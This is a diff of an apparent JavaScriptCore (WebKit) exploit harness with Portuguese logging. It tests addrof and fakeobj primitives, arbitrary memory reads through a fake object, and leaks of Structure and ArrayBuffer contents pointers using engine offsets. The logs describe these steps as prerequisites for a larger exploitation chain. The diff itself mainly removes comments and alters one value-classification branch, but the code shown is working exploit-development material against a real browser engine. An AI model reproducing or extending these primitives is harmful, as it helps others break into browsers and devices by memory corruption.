@@ -85,6 +85,8 @@ async function testJITBehavior() {
 }
 
 // --- Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA (AGORA COM UINT8ARRAY) ---
+// Note: This function's definition is in main.mjs, but its *purpose* is to test core primitives.
+// The actual execution flow passes JSC_OFFSETS_PARAM from main to this function.
 async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
     logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA de UINT8ARRAY ---`, 'test', FNAME);
@@ -149,13 +151,13 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
                             if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true;
                         } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET) {
                             guess = `ABView M_LENGTH (expected 0x18): ${val.low()}`;
-                        } else if (val.low() === test_uint8_array_to_dump[offset]) { // Tentativa de ler dados brutos
+                        } else if (val.low() === test_uint8_array_to_dump[offset]) {
                             guess = `Raw Data Byte (0x${test_uint8_array_to_dump[offset].toString(16)})`;
                         } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) {
                             const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                             guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
-                        } else {
-                            guess = `Raw Value: ${val.toString(true)}`;
+                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) {
+                            guess = `Float64: ${val.toNumber()}`;
                         }
                     }
                 } else {
@@ -197,10 +199,8 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
 
         if (!associated_arraybuffer_ptr_val.equals(AdvancedInt64.Zero) && !associated_arraybuffer_ptr_val.equals(AdvancedInt64.NaNValue)) {
             logFn(`SUCESSO PARCIAL: Ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET do Uint8Array NÃO É ZERO/NaN.`, 'good', FNAME);
-            contents_ptr_leaked = true; // Confirma que um ponteiro de conteúdo foi lido.
+            contents_ptr_leaked = true;
 
-            // Agora que temos o ponteiro para o ArrayBuffer subjacente, podemos tentar ler o conteúdo dele.
-            // Para isso, precisamos do offset CONTENTS_IMPL_POINTER_OFFSET (0x10) DENTRO do ArrayBuffer.
             logFn(`Tentando ler CONTENTS_IMPL_POINTER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET.toString(16)}) do ArrayBuffer (apontado por ASSOCIATED_ARRAYBUFFER_OFFSET)...`, 'info', FNAME);
             const contents_impl_ptr_from_arraybuffer_addr = associated_arraybuffer_ptr_val.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
             const contents_impl_ptr_val = await arb_read(contents_impl_ptr_from_arraybuffer_addr, 8);
@@ -208,8 +208,6 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
 
             if (!contents_impl_ptr_val.equals(AdvancedInt64.Zero) && !contents_impl_ptr_val.equals(AdvancedInt64.NaNValue)) {
                 logFn(`SUCESSO CRÍTICO: Ponteiro CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer NÃO É ZERO/NaN! Este é o ponteiro para os dados reais do ArrayBuffer!`, 'vuln', FNAME);
-                // Podemos usar esse ponteiro para verificar a leitura/escrita arbitrária de dados.
-                // Tentar ler o primeiro byte do conteúdo real do ArrayBuffer
                 logFn(`Verificando o primeiro byte do conteúdo real do ArrayBuffer (esperado ${toHex(test_uint8_array_to_dump[0])})...`, 'info', FNAME);
                 const first_byte_val = await arb_read(contents_impl_ptr_val, 1);
                 if (first_byte_val === test_uint8_array_to_dump[0]) {
@@ -253,9 +251,8 @@ async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_
         contents_ptr_leaked = false;
     } finally {
         logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, 'test', FNAME);
-        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj (obj simples): ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (Uint8Array, no offset 0x8): ${structure_ptr_found}, Conteúdo/m_vector Ponteiro Vazado (Uint8Array): ${contents_ptr_leaked}`, 'info', FNAME);
+        logFn(`Resultados: Addrof OK: ${addrof_success}, Fakeobj Criação OK: ${fakeobj_success}, L/E via Fakeobj (obj simples) OK: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (Uint8Array, no offset 0x8): ${structure_ptr_found}, Conteúdo/m_vector Ponteiro Vazado (Uint8Array): ${contents_ptr_leaked}`, 'info', FNAME);
     }
-    // Retorna true apenas se as primitivas base e o vazamento do ponteiro de conteúdo do AB funcionarem
     return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && contents_ptr_leaked;
 }
 
@@ -341,8 +338,7 @@ function initializeAndRunTest() {
                 await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
 
                 // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
-                // Removido o argumento 'isAdvancedInt64Object' daqui, pois ele não é mais necessário
-                // em testIsolatedAddrofFakeobjCoreAndDump, graças à importação corrigida em core_exploit.mjs.
+                // Removido o argumento 'isAdvancedInt64Object' daqui.
                 const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS);
                 if (!addrof_fakeobj_dump_test_passed) {
                     log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
